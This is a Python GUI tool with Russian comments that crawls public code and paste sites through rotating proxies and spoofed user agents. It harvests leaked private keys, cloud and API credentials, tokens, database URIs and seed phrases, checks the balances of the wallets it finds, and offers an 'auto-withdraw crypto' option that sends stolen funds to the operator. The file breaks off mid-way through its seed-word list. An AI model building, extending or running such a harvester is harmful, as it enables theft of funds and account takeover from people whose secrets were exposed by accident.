#!/usr/bin/env python3
"""
Site Scanner GUI - Параллельный сканер сайтов с поиском ключей
Проверяет 100+ сайтов одновременно с задержкой 600ms
"""

import asyncio
import aiohttp
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import random
import json
import os
import re
import csv
import hashlib
import base58
from datetime import datetime
from typing import List, Dict, Optional
import webbrowser
from eth_keys import keys as eth_keys_lib
from eth_utils import to_checksum_address
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

class SiteScannerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("🚀 Site Scanner v2.0 - Параллельный поиск ключей")
        self.root.geometry("1400x900")
        
        # Переменные
        self.delay_var = tk.DoubleVar(value=0.6)
        self.threads_var = tk.IntVar(value=30)
        self.timeout_var = tk.IntVar(value=10)
        self.is_scanning = False
        self.results = []
        self.sites = []
        self.filtered_keys_count = 0  # Счетчик отфильтрованных ключей (мусор)
        self.check_balances_var = tk.BooleanVar(value=False)
        self.check_nft_var = tk.BooleanVar(value=False)
        self.spider_mode_var = tk.BooleanVar(value=False)
        self.max_spider_depth = tk.IntVar(value=2)
        self.visited_urls = set()  # Для отслеживания посещенных URL
        
        # Proxy настройки
        self.use_proxy_var = tk.BooleanVar(value=False)
        self.proxy_list = []
        self.current_proxy_index = 0
        
        # Автовывод крипты
        self.auto_withdraw_var = tk.BooleanVar(value=False)
        self.withdraw_address = tk.StringVar(value="")
        
        # API ключи (можно настроить)
        self.etherscan_api_key = "YourEtherscanAPIKey"  # Получить на etherscan.io
        self.alchemy_api_key = "YourAlchemyAPIKey"  # Получить на alchemy.com
        
        # Популярные ERC-20 токены для проверки
        self.erc20_tokens = {
            'USDT': '0xdac17f958d2ee523a2206206994597c13d831ec7',
            'USDC': '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48',
            'LINK': '0x514910771af9ca656af840dff83e8264ecf986ca',
            'UNI': '0x1f9840a85d5af5bf1d1762f925bdaddc4201f984',
            'DAI': '0x6b175474e89094c44da98b954eedeac495271d0f',
            'WBTC': '0x2260fac5e5542a773aa44fbcfedf7c193bc2c599',
            'MATIC': '0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0',
            'SHIB': '0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce'
        }
        
        # Создаем папку для результатов
        self.create_results_folder()
        
        # Создаем интерфейс
        self.create_widgets()
        
        # Загружаем сайты по умолчанию
        self.load_default_sites()
        
        self.log("="*80, "HEADER")
        self.log("🚀 SITE SCANNER v2.0 - Параллельный сканер сайтов", "HEADER")
        self.log(f"📁 Результаты: {self.results_folder}", "INFO")
        self.log("="*80, "HEADER")
    
    def create_results_folder(self):
        """Создание папки для результатов"""
        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        self.results_folder = os.path.join(desktop, "SiteScanner_Results")
        
        if not os.path.exists(self.results_folder):
            os.makedirs(self.results_folder)
    
    def create_widgets(self):
        """Создание интерфейса"""
        
        # Левая панель
        left_panel = ttk.Frame(self.root, width=400)
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, padx=5, pady=5)
        left_panel.pack_propagate(False)
        
        # Настройки
        settings_frame = ttk.LabelFrame(left_panel, text="⚙️ НАСТРОЙКИ", padding=5)
        settings_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # Задержка
        delay_frame = ttk.Frame(settings_frame)
        delay_frame.pack(fill=tk.X, pady=2)
        ttk.Label(delay_frame, text="Задержка (сек):").pack(side=tk.LEFT)
        ttk.Spinbox(delay_frame, from_=0.1, to=3.0, increment=0.1, 
                   textvariable=self.delay_var, width=10).pack(side=tk.RIGHT)
        
        # Потоки
        threads_frame = ttk.Frame(settings_frame)
        threads_frame.pack(fill=tk.X, pady=2)
        ttk.Label(threads_frame, text="Потоков:").pack(side=tk.LEFT)
        ttk.Spinbox(threads_frame, from_=1, to=100, 
                   textvariable=self.threads_var, width=10).pack(side=tk.RIGHT)
        
        # Таймаут
        timeout_frame = ttk.Frame(settings_frame)
        timeout_frame.pack(fill=tk.X, pady=2)
        ttk.Label(timeout_frame, text="Таймаут (сек):").pack(side=tk.LEFT)
        ttk.Spinbox(timeout_frame, from_=5, to=30, 
                   textvariable=self.timeout_var, width=10).pack(side=tk.RIGHT)
        
        # Дополнительные опции
        options_frame = ttk.Frame(settings_frame)
        options_frame.pack(fill=tk.X, pady=5)
        ttk.Checkbutton(options_frame, text="Проверять балансы", 
                       variable=self.check_balances_var).pack(anchor=tk.W)
        ttk.Checkbutton(options_frame, text="Искать NFT", 
                       variable=self.check_nft_var).pack(anchor=tk.W)
        ttk.Checkbutton(options_frame, text="🕷️ Spider Mode (краулинг)", 
                       variable=self.spider_mode_var).pack(anchor=tk.W)
        
        # Глубина Spider
        spider_frame = ttk.Frame(settings_frame)
        spider_frame.pack(fill=tk.X, pady=2)
        ttk.Label(spider_frame, text="Глубина Spider:").pack(side=tk.LEFT)
        ttk.Spinbox(spider_frame, from_=1, to=5, 
                   textvariable=self.max_spider_depth, width=10).pack(side=tk.RIGHT)
        
        # Proxy настройки
        proxy_label_frame = ttk.LabelFrame(left_panel, text="🔒 PROXY НАСТРОЙКИ", padding=5)
        proxy_label_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Checkbutton(proxy_label_frame, text="Использовать Proxy", 
                       variable=self.use_proxy_var).pack(anchor=tk.W)
        
        proxy_btn_frame = ttk.Frame(proxy_label_frame)
        proxy_btn_frame.pack(fill=tk.X, pady=5)
        ttk.Button(proxy_btn_frame, text="📂 Загрузить proxy.txt", 
                  command=self.load_proxy_file).pack(side=tk.LEFT, padx=2)
        
        self.proxy_count_label = ttk.Label(proxy_label_frame, text="Proxy: 0")
        self.proxy_count_label.pack(anchor=tk.W)
        
        # Автовывод
        withdraw_frame = ttk.LabelFrame(left_panel, text="💸 АВТОВЫВОД КРИПТЫ", padding=5)
        withdraw_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Checkbutton(withdraw_frame, text="Автоматически выводить крипту", 
                       variable=self.auto_withdraw_var).pack(anchor=tk.W)
        
        ttk.Label(withdraw_frame, text="Ваш адрес:").pack(anchor=tk.W)
        ttk.Entry(withdraw_frame, textvariable=self.withdraw_address, 
                 width=40).pack(fill=tk.X, pady=2)
        
        # Список сайтов
        sites_frame = ttk.LabelFrame(left_panel, text="🌐 СПИСОК САЙТОВ", padding=5)
        sites_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Текстовое поле для сайтов
        self.sites_text = scrolledtext.ScrolledText(
            sites_frame, height=15, font=('Courier', 9)
        )
        self.sites_text.pack(fill=tk.BOTH, expand=True, pady=5)
        
        # Кнопки для сайтов
        btn_frame = ttk.Frame(sites_frame)
        btn_frame.pack(fill=tk.X)
        
        ttk.Button(btn_frame, text="📂 Загрузить из файла", 
                  command=self.load_sites_file).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="💾 Сохранить список", 
                  command=self.save_sites_file).pack(side=tk.LEFT, padx=2)
        
        # Управление
        control_frame = ttk.LabelFrame(left_panel, text="🎮 УПРАВЛЕНИЕ", padding=5)
        control_frame.pack(fill=tk.X, padx=5, pady=5)
        
        button_frame = ttk.Frame(control_frame)
        button_frame.pack(fill=tk.X)
        
        self.btn_start = ttk.Button(button_frame, text="▶️ СТАРТ", 
                                    command=self.start_scan, width=15)
        self.btn_start.pack(side=tk.LEFT, padx=2)
        
        self.btn_stop = ttk.Button(button_frame, text="⏹️ СТОП", 
                                   command=self.stop_scan, state=tk.DISABLED, width=15)
        self.btn_stop.pack(side=tk.LEFT, padx=2)
        
        self.btn_save = ttk.Button(button_frame, text="💾 TXT", 
                                   command=self.save_results, width=10)
        self.btn_save.pack(side=tk.LEFT, padx=2)
        
        self.btn_csv = ttk.Button(button_frame, text="📄 CSV", 
                                  command=self.save_results_csv, width=10)
        self.btn_csv.pack(side=tk.LEFT, padx=2)
        
        self.btn_json = ttk.Button(button_frame, text="📦 JSON", 
                                   command=self.save_results_json, width=10)
        self.btn_json.pack(side=tk.LEFT, padx=2)
        
        self.btn_clear = ttk.Button(button_frame, text="🗑️ ОЧИСТИТЬ", 
                                    command=self.clear_all, width=15)
        self.btn_clear.pack(side=tk.LEFT, padx=2)
        
        # Статистика
        stats_frame = ttk.LabelFrame(left_panel, text="📊 СТАТИСТИКА", padding=5)
        stats_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.stats_text = tk.Text(stats_frame, height=8, font=('Courier', 9), bg='#f0f0f0')
        self.stats_text.pack(fill=tk.X)
        
        # Правая панель - ЛОГ
        right_panel = ttk.Frame(self.root)
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        log_frame = ttk.LabelFrame(right_panel, text="🔍 ЛОГ СКАНЕРОВАНИЯ", padding=5)
        log_frame.pack(fill=tk.BOTH, expand=True)
        
        self.log_text = scrolledtext.ScrolledText(
            log_frame, font=('Courier', 9), wrap=tk.WORD,
            bg='#1e1e1e', fg='#00ff00'
        )
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        # Теги для логов
        self.log_text.tag_config("HEADER", foreground="#ffffff", font=('Courier', 10, 'bold'))
        self.log_text.tag_config("INFO", foreground="#00ffff")
        self.log_text.tag_config("SUCCESS", foreground="#00ff00")
        self.log_text.tag_config("KEY", foreground="#ff00ff", font=('Courier', 9, 'bold'))
        self.log_text.tag_config("ERROR", foreground="#ff0000")
        self.log_text.tag_config("WARNING", foreground="#ffff00")
        
        # Статус бар
        self.status_bar = ttk.Label(self.root, text="Готов", relief=tk.SUNKEN)
        self.status_bar.pack(fill=tk.X, side=tk.BOTTOM)
    
    def log(self, message: str, tag: str = "INFO"):
        """Добавление в лог"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        self.log_text.insert(tk.END, f"[{timestamp}] {message}\n", tag)
        self.log_text.see(tk.END)
        self.root.update_idletasks()
    
    def update_stats(self):
        """Обновление статистики"""
        total = len(self.sites)
        scanned = len([r for r in self.results if r.get('status') == 'ok'])
        keys = sum(len(r.get('keys', [])) for r in self.results)
        
        stats = f"""
╔══════════════════════════╗
║        📊 СТАТИСТИКА     ║
╚══════════════════════════╝

Всего сайтов:    {total}
Отсканировано:   {scanned}
✅ Валидных ключей: {keys}
❌ Отфильтровано: {self.filtered_keys_count}
🎯 Сайтов с ключами: {len([r for r in self.results if r.get('keys')])}

⏱️ {datetime.now().strftime('%H:%M:%S')}
"""
        self.stats_text.delete(1.0, tk.END)
        self.stats_text.insert(1.0, stats)
    
    def load_proxy_file(self):
        """Загрузка прокси из файла"""
        filename = filedialog.askopenfilename(
            title="Выберите файл с proxy",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if filename:
            try:
                with open(filename, 'r', encoding='utf-8') as f:
                    self.proxy_list = []
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            self.proxy_list.append(line)
                
                self.proxy_count_label.config(text=f"Proxy: {len(self.proxy_list)}")
                self.log(f"🔒 Загружено {len(self.proxy_list)} proxy", "SUCCESS")
                messagebox.showinfo("Успех", f"Загружено {len(self.proxy_list)} proxy")
            except Exception as e:
                messagebox.showerror("Ошибка", f"Не удалось загрузить proxy: {e}")
    
    def get_next_proxy(self) -> Optional[str]:
        """Получить следующий proxy из списка (ротация)"""
        if not self.proxy_list or not self.use_proxy_var.get():
            return None
        
        proxy = self.proxy_list[self.current_proxy_index]
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxy_list)
        return proxy
    
    def parse_proxy_url(self, proxy_str: str) -> Optional[str]:
        """
        Преобразование proxy в формат URL
        Поддерживаемые форматы:
        - socks5://user:pass@host:port
        - http://user:pass@host:port
        - host:port:user:pass
        - host:port
        """
        try:
            # Если уже в формате URL
            if proxy_str.startswith(('http://', 'https://', 'socks5://', 'socks4://')):
                return proxy_str
            
            # Формат: host:port:user:pass
            parts = proxy_str.split(':')
            if len(parts) == 4:
                host, port, user, password = parts
                return f"socks5://{user}:{password}@{host}:{port}"
            # Формат: host:port
            elif len(parts) == 2:
                host, port = parts
                return f"http://{host}:{port}"
        except:
            pass
        
        return None
    
    def load_default_sites(self):
        """Загрузка сайтов по умолчанию"""
        default_sites = [
            "https://github.com",
            "https://gitlab.com",
            "https://bitbucket.org",
            "https://pastebin.com",
            "https://gist.github.com",
            "https://codeshare.io",
            "https://jsfiddle.net",
            "https://codepen.io",
            "https://replit.com",
            "https://glitch.com"
        ]
        
        for site in default_sites:
            self.sites_text.insert(tk.END, site + "\n")
        
        self.log("📋 Загружены сайты по умолчанию", "INFO")
    
    def load_sites_file(self):
        """Загрузка сайтов из файла"""
        filename = filedialog.askopenfilename(
            title="Выберите файл со списком сайтов",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if filename:
            try:
                with open(filename, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                self.sites_text.delete(1.0, tk.END)
                self.sites_text.insert(1.0, content)
                self.log(f"📂 Загружено сайтов из {filename}", "SUCCESS")
            except Exception as e:
                messagebox.showerror("Ошибка", f"Не удалось загрузить файл: {e}")
    
    def save_sites_file(self):
        """Сохранение списка сайтов"""
        filename = filedialog.asksaveasfilename(
            title="Сохранить список сайтов",
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if filename:
            try:
                content = self.sites_text.get(1.0, tk.END)
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(content)
                self.log(f"💾 Список сайтов сохранен", "SUCCESS")
            except Exception as e:
                messagebox.showerror("Ошибка", f"Не удалось сохранить: {e}")
    
    def get_sites_list(self) -> List[str]:
        """Получение списка сайтов из текстового поля"""
        content = self.sites_text.get(1.0, tk.END)
        sites = []
        
        for line in content.split('\n'):
            line = line.strip()
            if line and not line.startswith('#'):
                if not line.startswith(('http://', 'https://')):
                    line = 'https://' + line
                sites.append(line)
        
        return sites
    
    def start_scan(self):
        """Запуск сканирования"""
        self.sites = self.get_sites_list()
        
        if not self.sites:
            messagebox.showwarning("Внимание", "Добавьте сайты для сканирования")
            return
        
        self.is_scanning = True
        self.results = []
        self.filtered_keys_count = 0  # Сбрасываем счетчик
        
        self.btn_start.config(state=tk.DISABLED)
        self.btn_stop.config(state=tk.NORMAL)
        
        self.log("", "HEADER")
        self.log("🚀 НАЧАЛО СКАНИРОВАНИЯ", "HEADER")
        self.log(f"📊 Сайтов: {len(self.sites)}", "INFO")
        self.log(f"⚙️ Задержка: {self.delay_var.get()} сек, Потоков: {self.threads_var.get()}", "INFO")
        self.log("-"*60, "INFO")
        
        # Запускаем в отдельном потоке
        thread = threading.Thread(target=self.run_scan, daemon=True)
        thread.start()
    
    def run_scan(self):
        """Запуск асинхронного сканирования"""
        asyncio.run(self.async_scan())
    
    async def async_scan(self):
        """Асинхронное сканирование"""
        # Логируем использование proxy
        if self.use_proxy_var.get() and self.proxy_list:
            self.log(f"🔒 PROXY АКТИВИРОВАН! Используется {len(self.proxy_list)} proxy", "SUCCESS")
        
        connector = aiohttp.TCPConnector(limit=self.threads_var.get())
        timeout = aiohttp.ClientTimeout(total=self.timeout_var.get())
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # Режим Spider - краулинг с рекурсией
            if self.spider_mode_var.get():
                self.log("🕷️ SPIDER MODE АКТИВИРОВАН!", "HEADER")
                self.log(f"Макс. глубина: {self.max_spider_depth.get()}", "INFO")
                
                self.visited_urls.clear()
                all_spider_results = []
                
                for site in self.sites:
                    if not self.is_scanning:
                        break
                    self.log(f"\n🎯 Начало Spider краулинга: {site}", "HEADER")
                    spider_results = await self.spider_crawl(session, site, 0, self.max_spider_depth.get())
                    all_spider_results.extend(spider_results)
                
                self.results = all_spider_results
            
            # Обычный режим - параллельное сканирование
            else:
                semaphore = asyncio.Semaphore(self.threads_var.get())
                
                tasks = []
                for site in self.sites:
                    task = self.check_site(session, site, semaphore)
                    tasks.append(task)
                
                results = await asyncio.gather(*tasks)
                self.results = [r for r in results if r]
        
        # Анализ результатов
        self.analyze_results()
    
    async def check_site(self, session, site: str, semaphore):
        """Проверка одного сайта"""
        if not self.is_scanning:
            return None
        
        async with semaphore:
            # Задержка
            await asyncio.sleep(self.delay_var.get())
            
            # Рандомный User-Agent
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
            ]
            
            headers = {
                'User-Agent': random.choice(user_agents),
                'Accept': 'text/html,application/xhtml+xml',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
            
            # Получаем proxy если включен
            proxy = None
            if self.use_proxy_var.get():
                proxy_str = self.get_next_proxy()
                if proxy_str:
                    proxy = self.parse_proxy_url(proxy_str)
            
            try:
                start_time = datetime.now()
                
                async with session.get(site, headers=headers, ssl=False, proxy=proxy) as response:
                    elapsed = (datetime.now() - start_time).total_seconds()
                    
                    if response.status == 200:
                        html = await response.text()
                        keys = self.find_real_keys(html)
                        
                        # Проверяем балансы и NFT если найдены ключи
                        enriched_keys = []
                        if keys and (self.check_balances_var.get() or self.check_nft_var.get()):
                            enriched_keys = await self.enrich_keys_with_data(keys)
                        
                        status = f"✅ {response.status}"
                        if keys:
                            self.log(f"🔑 {site} - НАЙДЕНО {len(keys)} КЛЮЧЕЙ!", "KEY")
                            for i, key in enumerate(keys[:3]):
                                self.log(f"   {key[:80]}...", "KEY")
                                # Показываем баланс если есть
                                if enriched_keys and i < len(enriched_keys):
                                    if enriched_keys[i].get('balance'):
                                        bal = enriched_keys[i]['balance']
                                        self.log(f"      💰 {bal['balance']:.8f} {bal['currency']}", "SUCCESS")
                                    if enriched_keys[i].get('nfts'):
                                        nft = enriched_keys[i]['nfts']
                                        self.log(f"      🖼️ NFT: {nft['nft_count']}", "SUCCESS")
                        else:
                            self.log(f"📄 {site} - {response.status} ({elapsed:.1f} сек)", "INFO")
                        
                        return {
                            'site': site,
                            'status': 'ok',
                            'http_status': response.status,
                            'keys': keys,
                            'enriched_keys': enriched_keys if enriched_keys else keys,
                            'time': elapsed,
                            'size': len(html)
                        }
                    else:
                        self.log(f"⚠️ {site} - HTTP {response.status}", "WARNING")
                        return {
                            'site': site,
                            'status': 'error',
                            'http_status': response.status,
                            'keys': [],
                            'time': elapsed
                        }
                        
            except asyncio.TimeoutError:
                self.log(f"⏰ {site} - Таймаут ({self.timeout_var.get()} сек)", "ERROR")
                return {'site': site, 'status': 'timeout', 'keys': []}
            except Exception as e:
                self.log(f"❌ {site} - Ошибка: {str(e)[:50]}", "ERROR")
                return {'site': site, 'status': 'error', 'keys': []}
    
    def find_real_keys(self, html: str) -> List[str]:
        """
        Поиск РЕАЛЬНЫХ ключей в HTML
        Только настоящие приватные ключи, API ключи и токены
        """
        keys = []
        
        # 1. Приватные ключи EVM (64 hex символа с 0x или без)
        evm_patterns = [
            r'0x[a-fA-F0-9]{64}',  # с 0x
            r'\b[a-fA-F0-9]{64}\b',  # без 0x
            r'private[_\-]?key["\']?\s*[:=]\s*["\']?(0x[a-fA-F0-9]{64})',
            r'secret[_\-]?key["\']?\s*[:=]\s*["\']?(0x[a-fA-F0-9]{64})',
            r'wallet[_\-]?seed["\']?\s*[:=]\s*["\']?([a-fA-F0-9]{64})'
        ]
        
        for pattern in evm_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    match = match[0]
                if len(match) >= 64 and all(c in '0123456789abcdefABCDEF' for c in match.replace('0x', '')):
                    # ВАЛИДАЦИЯ: фильтруем мусор (хэши транзакций, ID элементов)
                    if self.is_valid_private_key(match):
                        # ПОЛНЫЙ ключ без обрезки
                        keys.append(f"EVM Private Key: {match}")
                    else:
                        # Считаем отфильтрованные (мусор)
                        self.filtered_keys_count += 1
        
        # 2. API ключи (32-64 символа, буквы и цифры)
        api_patterns = [
            r'api[_\-]?key["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]{32,64})["\']?',
            r'api[_\-]?secret["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]{32,64})["\']?',
            r'app[_\-]?key["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]{32,64})["\']?',
            r'app[_\-]?secret["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]{32,64})["\']?'
        ]
        
        for pattern in api_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            for match in matches:
                if len(match) >= 32:
                    # ПОЛНЫЙ ключ
                    keys.append(f"API Key: {match}")
        
        # 3. AWS ключи (начинаются с AKIA)
        aws_pattern = r'(AKIA[0-9A-Z]{16})'
        matches = re.findall(aws_pattern, html)
        for match in matches:
            keys.append(f"AWS Key: {match}")
        
        # 4. GitHub токены (40 символов)
        github_patterns = [
            r'github[_\-]?token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]{40})["\']?',
            r'ghp_[a-zA-Z0-9]{36}',
            r'gho_[a-zA-Z0-9]{36}'
        ]
        
        for pattern in github_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    match = match[0]
                # ПОЛНЫЙ токен
                keys.append(f"GitHub Token: {match}")
        
        # 5. JWT токены
        jwt_pattern = r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'
        matches = re.findall(jwt_pattern, html)
        for match in matches[:5]:  # Ограничиваем количество
            # ПОЛНЫЙ JWT
            keys.append(f"JWT Token: {match}")
        
        # 6. MongoDB строки подключения
        mongo_pattern = r'mongodb(?:\+srv)?://[a-zA-Z0-9_:@/\\.\-]+'
        matches = re.findall(mongo_pattern, html)
        for match in matches:
            # ПОЛНЫЙ URI
            keys.append(f"MongoDB URI: {match}")
        
        # 7. PostgreSQL строки подключения
        postgres_pattern = r'postgres(?:ql)?://[a-zA-Z0-9_:@/\\.\-]+'
        matches = re.findall(postgres_pattern, html)
        for match in matches:
            # ПОЛНЫЙ URI
            keys.append(f"PostgreSQL URI: {match}")
        
        # 8. Настоящие мнемоники (12/24 слова из BIP39 словаря)
        # ПОЛНЫЙ список BIP39 (2048 слов)
        bip39_words = [
            'abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse',
            'access', 'accident', 'account', 'accuse', 'achieve', 'acid', 'acoustic', 'acquire', 'across', 'act',
            'action', 'actor', 'actress', 'actual', 'adapt', 'add', 'addict', 'address', 'adjust', 'admit',
            'adult', 'advance', 'advice', 'aerobic', 'affair', 'afford', 'afraid', 'again', 'age', 'agent',
            'agree', 'ahead', 'aim', 'air', 'airport', 'aisle', 'alarm', 'album', 'alcohol', 'alert',
            'alien', 'all', 'alley', 'allow', 'almost', 'alone', 'alpha', 'already', 'also', 'alter',
            'always', 'amateur', 'amazing', 'among', 'amount', 'amused', 'analyst', 'anchor', 'ancient', 'anger',
            'angle', 'angry', 'animal', 'ankle', 'announce', 'annual', 'another', 'answer', 'antenna', 'antique',
            'anxiety', 'any', 'apart', 'apology', 'appear', 'apple', 'approve', 'april', 'arch', 'arctic',
            'area', 'arena', 'argue', 'arm', 'armed', 'armor', 'army', 'around', 'arrange', 'arrest',
            'arrive', 'arrow', 'art', 'artefact', 'artist', 'artwork', 'ask', 'aspect', 'assault', 'asset',
            'assist', 'assume', 'asthma', 'athlete', 'atom', 'attack', 'attend', 'attitude', 'attract', 'auction',
            'audit', 'august', 'aunt', 'author', 'auto', 'autumn', 'average', 'avocado', 'avoid', 'awake',
            'aware', 'away', 'awesome', 'awful', 'awkward', 'axis', 'baby', 'bachelor', 'bacon', 'badge',
            'bag', 'balance', 'balcony', 'ball', 'bamboo', 'banana', 'banner', 'bar', 'barely', 'bargain',
            'barrel', 'base', 'basic', 'basket', 'battle', 'beach', 'bean', 'beauty', 'because', 'become',
            'beef', 'before', 'begin', 'behave', 'behind', 'believe', 'below', 'belt', 'bench', 'benefit',
            'best', 'betray', 'better', 'between', 'beyond', 'bicycle', 'bid', 'bike', 'bind', 'biology',
            'bird', 'birth', 'bitter', 'black', 'blade', 'blame', 'blanket', 'blast', 'bleak', 'bless',
            'blind', 'blood', 'blossom', 'blouse', 'blue', 'blur', 'blush', 'board', 'boat', 'body',
            'boil', 'bomb', 'bone', 'bonus', 'book', 'boost', 'border', 'boring', 'borrow', 'boss',
            'bottom', 'bounce', 'box', 'boy', 'bracket', 'brain', 'brand', 'brass', 'brave', 'bread',
            'breeze', 'brick', 'bridge', 'brief', 'bright', 'bring', 'brisk', 'broccoli', 'broken', 'bronze',
            'broom', 'brother', 'brown', 'brush', 'bubble', 'buddy', 'budget', 'buffalo', 'build', 'bulb',
            'bulk', 'bullet', 'bundle', 'bunker', 'burden', 'burger', 'burst', 'bus', 'business', 'busy',
            'butter', 'buyer', 'buzz', 'cabbage', 'cabin', 'cable', 'cactus', 'cage', 'cake', 'call',
            'calm', 'camera', 'camp', 'can', 'canal', 'cancel', 'candy', 'cannon', 'canoe', 'canvas',
            'canyon', 'capable', 'capital', 'captain', 'car', 'carbon', 'card', 'cargo', 'carpet', 'carry',
            'cart', 'case', 'cash', 'casino', 'castle', 'casual', 'cat', 'catalog', 'catch', 'category',
            'cattle', 'caught', 'cause', 'caution', 'cave', 'ceiling', 'celery', 'cement', 'census', 'century',
            'cereal', 'certain', 'chair', 'chalk', 'champion', 'change', 'chaos', 'chapter', 'charge', 'chase',
            'chat', 'cheap', 'check', 'cheese', 'chef', 'cherry', 'chest', 'chicken', 'chief', 'child',
            'chimney', 'choice', 'choose', 'chronic', 'chuckle', 'chunk', 'churn', 'cigar', 'cinnamon', 'circle',
            'citizen', 'city', 'civil', 'claim', 'clap', 'clarify', 'claw', 'clay', 'clean', 'clerk',
            'clever', 'click', 'client', 'cliff', 'climb', 'clinic', 'clip', 'clock', 'clog', 'close',
            'cloth', 'cloud', 'clown', 'club', 'clump', 'cluster', 'clutch', 'coach', 'coast', 'coconut',
            'code', 'coffee', 'coil', 'coin', 'collect', 'color', 'column', 'combine', 'come', 'comfort',
            'comic', 'common', 'company', 'concert', 'conduct', 'confirm', 'congress', 'connect', 'consider', 'control',
            'convince', 'cook', 'cool', 'copper', 'copy', 'coral', 'core', 'corn', 'correct', 'cost',
            'cotton', 'couch', 'country', 'couple', 'course', 'cousin', 'cover', 'coyote', 'crack', 'cradle',
            'craft', 'cram', 'crane', 'crash', 'crater', 'crawl', 'crazy', 'cream', 'credit', 'creek',
            'crew', 'cricket', 'crime', 'crisp', 'critic', 'crop', 'cross', 'crouch', 'crowd', 'crucial',
            'cruel', 'cruise', 'crumble', 'crunch', 'crush', 'cry', 'crystal', 'cube', 'culture', 'cup',
            'cupboard', 'curious', 'current', 'curtain', 'curve', 'cushion', 'custom', 'cute', 'cycle', 'dad',
            'damage', 'damp', 'dance', 'danger', 'daring', 'dash', 'daughter', 'dawn', 'day', 'deal',
            'debate', 'debris', 'decade', 'december', 'decide', 'decline', 'decorate', 'decrease', 'deer', 'defense',
            'define', 'defy', 'degree', 'delay', 'deliver', 'demand', 'demise', 'denial', 'dentist', 'deny',
            'depart', 'depend', 'deposit', 'depth', 'deputy', 'derive', 'describe', 'desert', 'design', 'desk',
            'despair', 'destroy', 'detail', 'detect', 'develop', 'device', 'devote', 'diagram', 'dial', 'diamond',
            'diary', 'dice', 'diesel', 'diet', 'differ', 'digital', 'dignity', 'dilemma', 'dinner', 'dinosaur',
            'direct', 'dirt', 'disagree', 'discover', 'disease', 'dish', 'dismiss', 'disorder', 'display', 'distance',
            'divert', 'divide', 'divorce', 'dizzy', 'doctor', 'document', 'dog', 'doll', 'dolphin', 'domain',
            'donate', 'donkey', 'donor', 'door', 'dose', 'double', 'dove', 'draft', 'dragon', 'drama',
            'drastic', 'draw', 'dream', 'dress', 'drift', 'drill', 'drink', 'drip', 'drive', 'drop',
            'drum', 'dry', 'duck', 'dumb', 'dune', 'during', 'dust', 'dutch', 'duty', 'dwarf',
            'dynamic', 'eager', 'eagle', 'early', 'earn', 'earth', 'easily', 'east', 'easy', 'echo',
            'ecology', 'economy', 'edge', 'edit', 'educate', 'effort', 'egg', 'eight', 'either', 'elbow',
            'elder', 'electric', 'elegant', 'element', 'elephant', 'elevator', 'elite', 'else', 'embark', 'embody',
            'embrace', 'emerge', 'emotion', 'employ', 'empower', 'empty', 'enable', 'enact', 'end', 'endless',
            'endorse', 'enemy', 'energy', 'enforce', 'engage', 'engine', 'enhance', 'enjoy', 'enlist', 'enough',
            'enrich', 'enroll', 'ensure', 'enter', 'entire', 'entry', 'envelope', 'episode', 'equal', 'equip',
            'era', 'erase', 'erode', 'erosion', 'error', 'erupt', 'escape', 'essay', 'essence', 'estate',
            'eternal', 'ethics', 'evidence', 'evil', 'evoke', 'evolve', 'exact', 'example', 'excess', 'exchange',
            'excite', 'exclude', 'excuse', 'execute', 'exercise', 'exhaust', 'exhibit', 'exile', 'exist', 'exit',
            'exotic', 'expand', 'expect', 'expire', 'explain', 'expose', 'express', 'extend', 'extra', 'eye',
            'eyebrow', 'fabric', 'face', 'faculty', 'fade', 'faint', 'faith', 'fall', 'false', 'fame',
            'family', 'famous', 'fan', 'fancy', 'fantasy', 'farm', 'fashion', 'fat', 'fatal', 'father',
            'fatigue', 'fault', 'favorite', 'feature', 'february', 'federal', 'fee', 'feed', 'feel', 'female',
            'fence', 'festival', 'fetch', 'fever', 'few', 'fiber', 'fiction', 'field', 'figure', 'file',
